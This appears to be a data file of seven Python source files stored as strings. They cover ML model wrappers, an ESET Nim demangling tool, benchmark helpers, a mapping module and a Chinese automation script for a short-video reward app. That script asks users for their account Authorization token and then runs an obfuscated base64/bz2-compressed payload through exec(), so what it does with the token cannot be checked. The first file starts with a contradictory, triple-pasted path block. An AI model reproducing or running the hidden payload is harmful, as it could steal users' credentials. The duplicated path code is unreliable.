    "import sys\n# 'frozen' \u72b6\u614b\u306b\u5fdc\u3058\u3066\u9069\u5207\u306a\u30d5\u30a1\u30a4\u30eb\u30d1\u30b9\u3092\u53d6\u5f97\u3059\u308b\u95a2\u6570\ndef get_appropriate_file_path():\n    if getattr(sys, 'frozen', False):\n        return sys.executable + \"/Line2Normalmap/\"\n    else:\n        return __file__\nappropriate_file_path = get_appropriate_file_path()\nimport sys\n# 'frozen'\u72b6\u614b\u306b\u5fdc\u3058\u3066\u9069\u5207\u306a\u30d5\u30a1\u30a4\u30eb\u30d1\u30b9\u3092\u53d6\u5f97\u3059\u308b\u95a2\u6570\ndef get_appropriate_file_path():\n    if getattr(sys, 'frozen', False):\n        # \u30d3\u30eb\u30c9\u3055\u308c\u305f\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u5834\u5408\u3001sys.executable\u306e\u30d1\u30b9\u3092\u4f7f\u7528\n        return sys.executable + \"/Line2Normalmap/\"\n    else:\n        # \u305d\u3046\u3067\u306a\u3044\u5834\u5408\u306f\u3001\u5f93\u6765\u901a\u308aappropriate_file_path\u3092\u4f7f\u7528\n        return appropriate_file_path\n\n# \u9069\u5207\u306a\u30d5\u30a1\u30a4\u30eb\u30d1\u30b9\u3092\u53d6\u5f97\nappropriate_file_path = get_appropriate_file_path()\n\nimport sys\nimport os\n\n# 'frozen'\u72b6\u614b\u306b\u5fdc\u3058\u3066\u9069\u5207\u306a\u30d5\u30a1\u30a4\u30eb\u30d1\u30b9\u3092\u53d6\u5f97\u3059\u308b\u95a2\u6570\ndef get_appropriate_file_path():\n    if getattr(sys, 'frozen', False):\n        # \u30d3\u30eb\u30c9\u3055\u308c\u305f\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u5834\u5408\u3001os.path.dirname(sys.executable)\u306e\u30d1\u30b9\u3092\u4f7f\u7528\n        return os.path.dirname(sys.executable) + \"/ldm_patched/modules\"\n    else:\n        # \u305d\u3046\u3067\u306a\u3044\u5834\u5408\u306f\u3001\u5f93\u6765\u901a\u308aappropriate_file_path\u3092\u4f7f\u7528\n        return os.path.dirname(appropriate_file_path) \n\n# \u9069\u5207\u306a\u30d5\u30a1\u30a4\u30eb\u30d1\u30b9\u3092\u53d6\u5f97\nappropriate_file_path = get_appropriate_file_path()\n\n# Taken from https://github.com/comfyanonymous/ComfyUI\n# This file is only for reference, and not used in the backend or runtime.\n\n\nfrom ldm_patched.modules import sd1_clip\nimport torch\nimport os\n\nclass SD2ClipHModel(sd1_clip.SDClipModel):\n    def __init__(self, arch=\"ViT-H-14\", device=\"cpu\", max_length=77, freeze=True, layer=\"penultimate\", layer_idx=None, dtype=None):\n        if layer == \"penultimate\":\n            layer=\"hidden\"\n            layer_idx=-2\n\n        textmodel_json_config = os.path.join(appropriate_file_path, \"sd2_clip_config.json\")\n        super().__init__(device=device, freeze=freeze, layer=layer, layer_idx=layer_idx, textmodel_json_config=textmodel_json_config, dtype=dtype, special_tokens={\"start\": 49406, \"end\": 49407, \"pad\": 0})\n\nclass SD2ClipHTokenizer(sd1_clip.SDTokenizer):\n    def __init__(self, tokenizer_path=None, embedding_directory=None):\n        super().__init__(tokenizer_path, pad_with_end=False, embedding_directory=embedding_directory, embedding_size=1024)\n\nclass SD2Tokenizer(sd1_clip.SD1Tokenizer):\n    def __init__(self, embedding_directory=None):\n        super().__init__(embedding_directory=embedding_directory, clip_name=\"h\", tokenizer=SD2ClipHTokenizer)\n\nclass SD2ClipModel(sd1_clip.SD1ClipModel):\n    def __init__(self, device=\"cpu\", dtype=None, **kwargs):\n        super().__init__(device=device, dtype=dtype, clip_name=\"h\", clip_model=SD2ClipHModel, **kwargs)\n",
    "#!/bin/env python3\n# -*- encoding: utf8 -*-\n#\n# Copyright (c) 2024 ESET\n# Author: Alexandre C\u00f4t\u00e9 Cyr <alexandre.cote@eset.com>\n# See LICENSE file for redistribution.\n\nimport string\nimport re\nfrom binascii import unhexlify\nfrom functools import reduce\n\nNIM_STD = [\"system\", \"core\", \"pure\", \"js\", \"impure\", \"std\", \"windows\", \"posix\", \"wrappers\"]\nSUF_NONE = 0\nSUF_NIM = 1\nSUF_IDA = 2\n\nSPECIAL_CHAR_CONVS = {\n    \"dollar\": \"$\",\n    \"percent\": \"%\",\n    \"amp\": \"&\",\n    \"roof\": \"^\",\n    \"emark\": \"!\",\n    \"qmark\": \"?\",\n    \"star\": \"*\",\n    \"plus\": \"+\",\n    \"minus\": \"-\",\n    \"backslash\": \"\\\\\",\n    \"slash\": \"/\",\n    \"eq\": \"=\",\n    \"lt\": \"<\",\n    \"gt\": \">\",\n    \"tilde\": \"~\",\n    \"colon\": \":\",\n    \"dot\": \".\",\n    \"at\": \"@\",\n    \"bar\": \"|\"\n}\n\ndef _multi_replace(stri: str, conversions: dict) -> str:\n    return reduce(lambda s, conv: s.replace(conv[0], conv[1]), conversions.items(), stri)\n\n# return first match + length of key\ndef __decode_specialchar(substring):\n    try:\n        fnd_key = list(filter(lambda k: substring.startswith(k), SPECIAL_CHAR_CONVS.keys()))[0]\n        return SPECIAL_CHAR_CONVS[fnd_key], len(fnd_key)\n    except IndexError:\n        return substring[0], 1\n\n# Return string with replacements\ndef _decode_specialchars(stri: str) -> str:\n    return _multi_replace(stri, SPECIAL_CHAR_CONVS)\n\ndef _encode_specialchars(stri: str) -> str:\n    convs = {\n        \"$\": \"DOLLAR\",\n        \"%\": \"PERCENT\",\n        \"&\": \"AND\",\n        \"^\": \"ROOF\",\n        \"!\": \"EXCL\",\n        \"?\": \"QMARK\",\n        \"*\": \"STAR\",\n        \"+\": \"PLUS\",\n        \"-\": \"MINUS\",\n        \"/\": \"SLASH\",\n        \"\\\\\": \"BSLASH\",\n        \"=\": \"EQ\",\n        \"<\": \"LT\",\n        \">\": \"GT\",\n        \"~\": \"TILDE\",\n        \":\": \"COLON\",\n        \".\": \"DOT\",\n        \"@\": \"AT\",\n        \"|\": \"PIPE\"\n    }\n    return _multi_replace(stri, convs)\n\n# compiler/modulepaths;.nim -> demangleModuleName\ndef _decode_module_name(module_name: str) -> str:\n    convs = {\n        \"@s\": \"/\",\n        \"@h\": \"#\",\n        \"@c\": \":\",\n        \"@m\": \"\",\n        \"@@\": \"@\"\n    }\n    dec = _multi_replace(module_name, convs)\n    if dec.endswith(\".nim\"):\n        dec = dec[:-len(\".nim\")]\n    return dec\n\ndef _clean_name_ida(name: str) -> str:\n    STRIP_CHARS = r'[()\\[\\]{} \"]'\n    REPLACE_CHARS = r'[,;]'\n    name = re.sub(STRIP_CHARS, \"\", name)\n    return re.sub(REPLACE_CHARS, \"_\", name)\n\n# compiler/msgs.nim -> uniqueModuleName\ndef demangle_module(name: str) -> str:\n    plain = \"\"\n    i = 0\n    while i < len(name):\n        if name[i] in string.ascii_uppercase:\n            if name[i] == \"Z\":\n                plain = plain + \"/\"\n            elif name[i] == \"O\":\n                plain = plain + \".\"\n            else:\n                raise ValueError(\"Invalid special character '{}' in module name\".format(name[i]))\n        elif name[i] in string.ascii_lowercase:\n            plain = plain + name[i]\n        elif name[i] in string.digits and len(name) > i + 1 and name[i + 1] in string.digits:\n            plain = plain + chr(int(name[i:i + 2]))\n            i += 1\n        else:\n            plain = plain + name[i]\n        i += 1\n    return plain\n\n# Parse hex encoded substrings strings\n# Returns the parsed value and length and hown many characters were parsed\ndef __Xsubstring(substring: str) -> (str, int):\n    if len(substring) < 3:\n        return \"X\", 1\n    elif all(map(lambda c: c in string.hexdigits.upper(), substring[1:3])):\n        return unhexlify(substring[1:3]).decode(\"utf-8\"), 3\n    else:\n        return \"X\", 1\n\n# See https://github.com/nim-lang compiler/ccgutils.nim:mangle\ndef demangle_function(name: str) -> str:\n    plain = \"\"\n    if name[-1] != \"_\":  # underscore is added at the end of the name if any special encoding had to be performed\n        if name[0] == \"X\":\n            name = name[1:]\n        return name\n\n    name = name[:-1]  # remove trailing _\n    i = 0\n    if name[0] == \"X\" and name[1] in string.digits and name[2] not in string.hexdigits.upper():\n        plain = plain + name[1]\n        i = 2\n\n    while i < len(name):\n        if name[i] == \"X\":\n            v, ln = __Xsubstring(name[i:i + 3])\n            i += ln\n            plain = plain + v\n        elif name[i] in string.ascii_lowercase:\n            v, ln = __decode_specialchar(name[i:])\n            i += ln\n            plain = plain + v\n        else:\n            plain = plain + name[i]\n            i += 1\n\n    return plain\n\n# Represents a regular Package+function name\nclass NimName():\n    def __init__(self, namestr):\n        # <Function name>__<Package Name>_u<numeric ID>_<numeric IDA suffix>.<compiler suffix>@<C++ mangled arguments>\n        m = re.fullmatch(r'@?([a-zA-Z0-9_]+_?)__(.*)(_u[0-9]+)(_[0-9]+)?(\\.[a-z]+\\.[0-9]+)?(@[0-9]+)?', namestr)\n        if m is None or len(m.group(1)) <= 1:\n            raise ValueError(\"Invalid Nim function name \\\"{}\\\"\".format(namestr))\n        self.fnname = demangle_function(m.group(1))\n        self.pkgname = demangle_module(m.group(2))\n        self.suffix = m.group(3)[1:]\n        self.ida_suffix = m.group(4)\n     ",
    "import pickle\nfrom typing import Union\n\n\ndef get_video_config_by_video_id(benchmark_config: dict, video_id:int) -> dict:\n    \"\"\"Get video config by video id\n    Args:\n        benchmark_config (dict): benchmark config dictionary, in TAPVid format.\n        video_id (int): video id\n    Returns:\n        dict: video config.\n    \"\"\"\n    for video_config in benchmark_config[\"videos\"]:\n        if video_config[\"video_idx\"] == video_id:\n            return video_config\n    return None\n\n\ndef get_query_points_from_benchmark_config(benchmark_config:Union[str, dict], video_idx:int, rescale_sizes=None) -> dict:\n    \"\"\"Get query points from config file\n    Args:\n        benchmark_config (Union[str, dict]): benchmark config dict (or path to config), for all vidoes. adds frame_idx to the points. (x, y) to (x, y, frame_idx).\n        query points in tapvid format:\n            {frame_idx: [[x1,y1], [x2,y2], ...[xn,yn]], size=(N,3)}.\n    Returns:\n        dict: query points {frame_idx: [[x1,y1,frame_idx], [x2,y2,frame_idx], ...[xn,yn,frame_idx]], size=(N,3)}.\n    \"\"\"\n    benchmark_config = pickle.load(open(benchmark_config, \"rb\")) if type(benchmark_config) == str else benchmark_config\n    video_config = get_video_config_by_video_id(benchmark_config, video_idx)\n    rescale_factor_x = 1 if rescale_sizes is None else (rescale_sizes[0] / video_config['w'])\n    rescale_factor_y = 1 if rescale_sizes is None else (rescale_sizes[1] / video_config['h'])\n    \n    query_points_dict = {}\n    \n    for frame_idx, q_pts_at_frame in video_config['query_points'].items():\n        query_points_at_frame = []\n        for q_point in q_pts_at_frame:\n            query_points_at_frame.append([rescale_factor_x * q_point[0], rescale_factor_y * q_point[1], frame_idx])\n        query_points_dict[frame_idx] = query_points_at_frame\n\n    return query_points_dict\n",
    "from datasets import load_dataset, load_from_disk\nfrom transformers import AutoTokenizer, AutoModel, AutoModelForCausalLM, TextStreamer\nfrom huggingface_hub import hf_hub_download\nfrom rwkv.model import RWKV\nfrom rwkv.utils import PIPELINE, PIPELINE_ARGS\nimport torch\nimport argparse\nimport re\nfrom openai import OpenAI\nimport anthropic\nfrom mamba_ssm.models.mixer_seq_simple import MambaLMHeadModel\nimport vertexai\nfrom vertexai.generative_models import GenerativeModel, Part, GenerationConfig\nfrom lmdeploy import pipeline, GenerationConfig, TurbomindEngineConfig\nimport json\nimport os\n\nPROJECT_ID = \"gemini-infer\"  # @param {type:\"string\"}\nLOCATION = \"us-central1\"  # @param {type:\"string\"}\n\ngeneration_config = GenerationConfig(\n    temperature=1,\n    top_p=1.0,\n    top_k=32,\n    candidate_count=1,\n    max_output_tokens=100,\n)\n\nall_labels = [\"admiration\",\n                \"amusement\",\n                \"anger\",\n                \"annoyance\",\n                \"approval\",\n                \"caring\",\n                \"confusion\",\n                \"curiosity\",\n                \"desire\",\n                \"disappointment\",\n                \"disapproval\",\n                \"disgust\",\n                \"embarrassment\",\n                \"excitement\",\n                \"fear\",\n                \"gratitude\",\n                \"grief\",\n                \"joy\",\n                \"love\",\n                \"nervousness\",\n                \"optimism\",\n                \"pride\",\n                \"realization\",\n                \"relief\",\n                \"remorse\",\n                \"sadness\",\n                \"surprise\",\n                \"neutral\"]\n\n\ndef generate_text(project_id: str, location: str, prompt: str, model) -> str:\n    # Initialize Vertex AI\n    vertexai.init(project=project_id, location=location)\n    responses = model.generate_content(prompt,\n                                       generation_config=generation_config,\n                                       stream=False)\n    for response in responses:\n        return response.text\n\ndef select_data(given_dataset, number_of_turns):\n    selected_data_list = []\n    label_to_data_dict = {}\n    for data in given_dataset:\n        if len(data['labels']) == 1:\n            cur_label = data['labels'][0]\n            if cur_label in label_to_data_dict:\n                label_to_data_dict[cur_label].append(data)\n            else:\n                label_to_data_dict[cur_label] = [data]\n    data_label_list = list(label_to_data_dict.keys())\n    selected_label_to_count = {key:0 for key in data_label_list}\n    for turn in range(number_of_turns):\n        for i, key in enumerate(data_label_list):\n            if len(label_to_data_dict[key]) > selected_label_to_count[key]:\n                selected_data_list.append(label_to_data_dict[key][selected_label_to_count[key]])\n                selected_label_to_count[key] += 1\n            else:\n                for other in range(i+1, len(data_label_list)):\n                    other_key = data_label_list[other]\n                    if len(label_to_data_dict[other_key]) > selected_label_to_count[other_key]:\n                        selected_data_list.append(label_to_data_dict[other_key][selected_label_to_count[other_key]])\n                        selected_label_to_count[other_key] += 1\n                        break\n\n    print(\"selected_data_list: \", selected_data_list)\n    print(\"selected data list length: \", len(selected_data_list))\n    return selected_data_list\n\ndef format_discovery_prompt(data_dict_list, round=0, with_instruction=False, context_token_number=\"2k\"):\n    token_shot_map_dict = {\"2k\": 73, \"5k\": 190, \"10k\": 380, \"15k\": 560, \"20k\": 740, \"25k\": 920,\n                           \"32k\": 1180}\n    prompt = 'Given a comment, please predict the emotion category of this comment. The predict answer must come from the demonstration examples with the exact format.'\n    if with_instruction:\n        prompt = prompt + 'You can only make prediction from the following categories: '\n        for i, word in enumerate(all_labels):\n            if i != len(all_labels) - 1:\n                prompt = prompt + word + ', '\n            else:\n                prompt = prompt + word + '.\\n'\n    prompt = prompt + ' The examples are as follows: \\n'\n    if round != 0:\n        index = len(data_dict_list)\n        print(f\"======={round} round running========\")\n        print(\"number of instances: \", index)\n    else:\n        index = token_shot_map_dict[context_token_number]\n    data_list = data_dict_list[:index]\n    for data in data_list:\n        prompt = prompt + \"comment: \" + data['text'] + \"\\nemotion category: \" + all_labels[data['labels'][0]] + '\\n'\n    return prompt\n\nparser = argparse.ArgumentParser(description=\"Long in-context Learning\",\n                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)\nparser.add_argument(\"-c\", \"--context_length\", type=str, default='2k', help=\"number of tokens the context have\")\nparser.add_argument(\"-m\", \"--model\", type=str, help=\"model name to test\")\nparser.add_",
    "'''\n# Adapted from https://github.com/baaivision/EVA/tree/master/EVA-CLIP\n'''\n\nfrom torchvision import transforms\nfrom torchvision.transforms.functional import InterpolationMode\nfrom transformers.image_processing_utils import BatchFeature\nfrom PIL import Image\nfrom transformers.image_transforms import convert_to_rgb\n\n\nclass BaseProcessor:\n    def __init__(self):\n        self.transform = lambda x: x\n        return\n\n    def __call__(self, item):\n        return self.transform(item)\n\n\nclass EvaClipImageBaseProcessor(BaseProcessor):\n    def __init__(self, mean=None, std=None):\n        self.mean = (0.48145466, 0.4578275, 0.40821073) if mean is None else mean\n        self.std = (0.26862954, 0.26130258, 0.27577711) if std is None else std\n\n        self.normalize = transforms.Normalize(self.mean, self.std)\n\n    @property\n    def image_mean(self):\n        return self.mean\n\n\nclass EvaClipImageTrainProcessor(EvaClipImageBaseProcessor):\n    def __init__(self, image_size=224, mean=None, std=None, min_scale=0.5, max_scale=1.0):\n        super().__init__(mean=mean, std=std)\n\n        self.transform = transforms.Compose(\n            [\n                convert_to_rgb,\n                transforms.Resize(\n                    image_size,\n                    interpolation=InterpolationMode.BICUBIC,\n                ),\n                transforms.CenterCrop(image_size),\n                transforms.ToTensor(),\n                self.normalize,\n            ]\n        )\n\n        self.image_size = image_size\n\n    def preprocess(self, images, return_tensors):\n        if isinstance(images, Image.Image):\n            images = [images]\n        else:\n            assert isinstance(images, list)\n\n        transformed_images = [self.transform(image).numpy() for image in images]\n        data = {\"pixel_values\": transformed_images}\n\n        return BatchFeature(data=data, tensor_type=return_tensors)\n\n    def __call__(self, item):\n        return self.transform(item)\n\n    @property\n    def crop_size(self):\n        return {'height': self.image_size, 'width': self.image_size}\n",
    "#   --------------------------------\u6ce8\u91ca\u533a--------------------------------\n#   \u5165\u53e3:https://www.xingdouduanju.com/pages/register/index.html?invite_code=351449 \u8d70\u4e2a\u5934\u8c22\u8c22\n#   \u53d8\u91cf:yuanshen_xddj \u591a\u53f7@\n#   \u6293\u53d6Authorization\u7684\u503c\u586b\u5165\n#   corn: \u516b\u5c0f\u65f6\u4e00\u6b21 22 8-23/8 * * *\nwatch_film = True#\u770b\u5267\u6a21\u5f0f\n#   --------------------------------\u4e00\u822c\u4e0d\u52a8\u533a--------------------------------\n#  code = \"xddj\"\n#  ver = \"1.1.2\n#                     _ooOoo_\n#                    o8888888o\n#                    88\" . \"88\n#                    (| -_- |)\n#                     O\\ = /O\n#                 ____/`---'\\____\n#               .   ' \\\\| |// `.\n#                / \\\\||| : |||// \\\n#              / _||||| -:- |||||- \\\n#                | | \\\\\\ - /// | |\n#              | \\_| ''\\---/'' | |\n#               \\ .-\\__ `-` ___/-. /\n#            ___`. .' /--.--\\ `. . __\n#         .\"\" '< `.___\\_<|>_/___.' >'\"\".\n#        | | : `- \\`.;`\\ _ /`;.`/ - ` : | |\n#          \\ \\ `-. \\_ __\\ /__ _/ .-` / /\n#  ======`-.____`-.___\\_____/___.-`____.-'======\n#                     `=---='\n# \n#  .............................................\n#           \u4f5b\u7956\u4fdd\u4f51             \u6c38\u65e0BUG\n#           \u4f5b\u7956\u9547\u697c             BUG\u8f9f\u90aa\n#\u4f5b\u66f0:  \n#        \u5199\u5b57\u697c\u91cc\u5199\u5b57\u95f4\uff0c\u5199\u5b57\u95f4\u91cc\u7a0b\u5e8f\u5458\uff1b  \n#        \u7a0b\u5e8f\u4eba\u5458\u5199\u7a0b\u5e8f\uff0c\u53c8\u62ff\u7a0b\u5e8f\u6362\u9152\u94b1\u3002  \n#        \u9152\u9192\u53ea\u5728\u7f51\u4e0a\u5750\uff0c\u9152\u9189\u8fd8\u6765\u7f51\u4e0b\u7720\uff1b  \n#        \u9152\u9189\u9152\u9192\u65e5\u590d\u65e5\uff0c\u7f51\u4e0a\u7f51\u4e0b\u5e74\u590d\u5e74\u3002  \n#        \u4f46\u613f\u8001\u6b7b\u7535\u8111\u95f4\uff0c\u4e0d\u613f\u97a0\u8eac\u8001\u677f\u524d\uff1b  \n#        \u5954\u9a70\u5b9d\u9a6c\u8d35\u8005\u8da3\uff0c\u516c\u4ea4\u81ea\u884c\u7a0b\u5e8f\u5458\u3002  \n#        \u522b\u4eba\u7b11\u6211\u5fd2\u75af\u766b\uff0c\u6211\u7b11\u81ea\u5df1\u547d\u592a\u8d31\uff1b  \n#        \u4e0d\u89c1\u6ee1\u8857\u6f02\u4eae\u59b9\uff0c\u54ea\u4e2a\u5f52\u5f97\u7a0b\u5e8f\u5458\uff1f\n#\n#   --------------------------------\u4ee3\u7801\u533a--------------------------------\n\nimport bz2, base64\nexec(bz2.decompress(base64.b64decode('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",
    "import time\n\nimport torch\nimport torchvision.transforms.functional as TF\n\nfrom como.depth_cov.core.DepthCovModule import DepthCovModule\nfrom como.depth_cov.core.gaussian_kernel import interpolate_kernel_params\n\nfrom como.geometry.affine_brightness import get_aff_w_curr\nfrom como.geometry.lie_algebra import normalizeSE3_inplace\nfrom como.geometry.transforms import get_T_w_curr, transform_points\nfrom como.geometry.camera import backprojection\n\nfrom como.odom.factors.pose_prior_factors import linearize_pose_prior\nfrom como.odom.factors.scalar_prior_factors import (\n    linearize_scalar_prior,\n    linearize_multi_scalar_prior,\n)\nfrom como.odom.factors.pixel_prior import pixel_prior_cost\nfrom como.odom.factors.gp_priors import gp_ml_cost, mean_log_depth_cost\nfrom como.odom.factors.depth_prior import log_depth_prior\n\nfrom como.odom.frontend.TwoFrameSfm import TwoFrameSfm\n\nfrom como.utils.config import str_to_dtype\nfrom como.utils.coords import normalize_coordinates, swap_coords_xy, get_test_coords\nfrom como.utils.image_processing import ImageGradientModule\nfrom como.utils.multiprocessing import init_gpu\n\nfrom como.odom.frontend.corr import track_and_init\nfrom como.odom.backend.sparse_map import (\n    setup_point_to_frame,\n    get_batch_remap_function,\n    setup_test_points,\n    subselect_pixels,\n)\n\nimport como.odom.backend.linear_system as lin_sys\nfrom como.odom.backend.photo import create_photo_system\n\n\n# Do not declare any CUDA tensors in init function\nclass Mapping:\n    def __init__(self, cfg, intrinsics):\n        super().__init__()\n\n        self.cfg = cfg\n        self.device = cfg[\"device\"]\n        self.dtype = str_to_dtype(cfg[\"dtype\"])\n\n        self.intrinsics = intrinsics.unsqueeze(0)\n\n        self.is_init = False\n\n    def setup(self):\n        init_gpu(self.device)\n        self.init_basic_vars()\n        self.load_model()\n        self.init_keyframe_vars()\n        self.init_prior_vals()\n        self.reset_iteration_vars(new_kf=True, converged=True)\n        self.two_frame_sfm = TwoFrameSfm(\n            self.cfg,\n            self.intrinsics[0, :, :],\n            self.model,\n            self.cov_level,\n            self.network_size,\n        )\n\n    def init_basic_vars(self):\n        if self.cfg[\"color\"] == \"gray\":\n            c = 1\n        elif self.cfg[\"color\"] == \"rgb\":\n            c = 3\n\n        self.intrinsics = self.intrinsics.to(device=self.device, dtype=self.dtype)\n        self.gradient_module = ImageGradientModule(\n            channels=c, device=self.device, dtype=self.dtype\n        )\n\n        self.last_kf_send_time = 0.0\n\n    def init_keyframe_vars(self):\n        # Bookkeeping\n        self.kf_timestamps = []\n\n        ## Keyframes\n        # Inputs\n        self.rgb = torch.empty(\n            (0), device=self.device, dtype=self.dtype\n        )  # For visualization\n        self.kf_img_and_grads = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.cov_params_img = torch.empty((0), device=self.device, dtype=self.dtype)\n        # Pose variables\n        self.kf_poses = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.kf_aff_params = torch.empty((0), device=self.device, dtype=self.dtype)\n        # Sparse pixel variables\n        self.depth_dims = []  # Bookkeeping points\n        self.pm_first_obs = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.pm = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.logzm = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.L_mm = torch.empty(\n            (0), device=self.device, dtype=self.dtype\n        )  # Store but updated constantly\n        self.Kmm_inv = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.Knm_Kmminv = torch.empty((0), device=self.device, dtype=self.dtype)\n        # Sparse landmark variables\n        self.correspondence_mask = torch.empty(\n            (0), device=self.device, dtype=self.dtype\n        )\n        self.P_m = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.obs_ref_mask = torch.empty(\n            (0), device=self.device, dtype=torch.bool\n        )  # whether point seen first\n\n        ## One-way Frames\n        self.recent_timestamps = []\n        # Inputs\n        self.recent_img_and_grads = torch.empty(\n            (0), device=self.device, dtype=self.dtype\n        )\n        # Pose variables\n        self.recent_poses = 